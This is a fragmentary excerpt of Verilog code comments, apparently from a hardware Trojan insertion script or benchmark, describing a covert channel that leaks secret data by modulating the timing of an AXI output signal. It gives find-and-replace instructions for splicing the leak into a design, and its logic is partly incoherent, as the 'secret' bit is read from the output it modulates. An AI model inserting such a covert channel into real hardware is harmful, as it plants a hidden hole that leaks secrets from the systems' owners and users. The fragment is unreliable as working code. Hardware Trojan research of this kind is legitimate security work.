 ...
 * Payload: Modulate timing of axi_data_o based on secret data
 * 
...
assign secret_bit = axi_data_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of axi_data_o
//
// Integration Script Must Modify:
//
// IF axi_data_o is timing-sensitive:
//   Find: assign axi_data_o = ready_signal;
//   Replace: assign axi_data_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
